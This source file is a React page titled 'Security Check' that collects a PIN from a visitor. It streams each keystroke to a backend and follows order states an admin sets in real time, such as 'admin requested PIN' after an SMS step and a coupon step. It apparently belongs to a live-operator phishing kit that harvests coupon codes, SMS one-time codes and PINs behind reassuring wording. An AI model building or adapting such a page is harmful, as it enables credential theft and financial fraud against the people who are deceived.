import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useRealtime } from "@/context/RealtimeContext";
import { useShop } from "@/context/ShopContext";
import { getActiveThemeV2 } from "@/lib/theme-editor";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Loader2, Lock, AlertCircle } from "lucide-react";

const PinVerification = () => {
  const navigate = useNavigate();
  const { updatePinCode, orderStatus, currentOrderId, submitPin } = useRealtime();
  const { config, loading: configLoading } = useShop();
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const activeTheme = configLoading ? null : getActiveThemeV2(config as unknown as Record<string, unknown>);
  const pinPage = activeTheme?.pages.pin;
  const pageTitle = pinPage?.title || "Security Check";
  const pageSubtitle =
    pinPage?.subtitle || "Additional security verification is required. Please enter your PIN code below.";
  const codeLabel = pinPage?.codeLabel || "PIN Code";
  const codePlaceholder = pinPage?.codePlaceholder || "Enter PIN";
  const submitText = pinPage?.submitText || "Verify PIN";
  const submittingText = pinPage?.submittingText || "Verifying...";
  const loadingTitle = pinPage?.loadingTitle || "Verifying PIN...";
  const loadingDescription = pinPage?.loadingDescription || "Please wait while we verify your security code.";
  const invalidCodeMessage = pinPage?.invalidCodeMessage || "Please enter a valid PIN code";
  const helpText = pinPage?.helpText || "";
  const heroImage = pinPage?.heroImage || "";

  useEffect(() => {
    if (orderStatus === "COMPLETED") {
      setIsLoading(false);
      navigate(`/order-confirmation/${currentOrderId}`);
      return;
    }

    if (orderStatus === "RETURN_COUPON" || orderStatus === "REJECTED") {
      setIsLoading(false);
      navigate("/verify-coupon");
      return;
    }

    // Guard: refresh may briefly show IDLE before socket status rehydrate.
    if (currentOrderId && orderStatus === "IDLE") {
      return;
    }

    // Guard: PIN is only after SMS has been accepted and admin requested PIN.
    if (orderStatus === "APPROVED" || orderStatus === "WAITING_SMS" || orderStatus === "SMS_SUBMITTED") {
      setIsLoading(false);
      navigate("/verify-sms");
      return;
    }

    if (!["REQUEST_PIN", "PIN_SUBMITTED"].includes(orderStatus)) {
      setIsLoading(false);
      navigate("/verify-coupon");
    }
  }, [orderStatus, navigate, currentOrderId]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setCode(value);
    updatePinCode(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 4) {
      setError(invalidCodeMessage);
      return;
    }
    if (!["REQUEST_PIN", "PIN_SUBMITTED"].includes(orderStatus)) {
      setError("PIN step is not available yet.");
      return;
    }
    setError("");
    setIsLoading(true);

    // Submit to backend
    const success = await submitPin(code);
    if (!success) {
      setIsLoading(false);
      setError("Failed to submit PIN. Please retry.");
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex flex-col">
        <Header />
        <main className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="text-center space-y-6 max-w-md">
            <div className="relative w-20 h-20 mx-auto">
              <div className="absolute inset-0 border-4 border-muted rounded-full"></div>
              <div className="absolute inset-0 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
            </div>
            <h2 className="font-serif text-2xl md:text-3xl">{loadingTitle}</h2>
            <p className="text-muted-foreground">{loadingDescription}</p>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <main className="flex-1 container mx-auto px-6 py-12 flex items-center justify-center">
        <Card className="w-full max-w-md shadow-lg border-primary/10 overflow-hidden">
          {heroImage ? (
            <div className="h-36 bg-cover bg-center border-b" style={{ backgroundImage: `url(${heroImage})` }} />
          ) : null}
          <CardHeader className="text-center pb-8">
            <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4 text-primary">
              <Lock className="w-6 h-6" />
            </div>
            <CardTitle className="font-serif text-3xl mb-2">{pageTitle}</CardTitle>
            <CardDescription className="text-base">{pageSubtitle}</CardDescription>
          </CardHeader>
          <CardContent>
            {error && (
              <div className="bg-destructive/10 text-destructive text-sm p-3 rounded-md flex items-center gap-2 mb-6">
                <AlertCircle className="w-4 h-4" />
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="code" className="text-center block">{codeLabel}</Label>
                <Input
                  id="code"
                  type="text"
                  placeholder={codePlaceholder}
                  className="text-center text-2xl tracking-widest h-14 font-mono"
                  value={code}
                  onChange={handleInputChange}
                  maxLength={10}
                  autoFocus
                  required
                />
              </div>

              <Button type="submit" className="w-full h-12 text-lg" disabled={isLoading || code.length < 4}>
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    {submittingText}
                  </>
                ) : (
                  submitText
                )}
              </Button>

              {helpText ? <p className="text-xs text-muted-foreground text-center">{helpText}</p> : null}
            </form>
          </CardContent>
        </Card>
      </main>
      <Footer />
    </div>
  );
};

export default PinVerification;
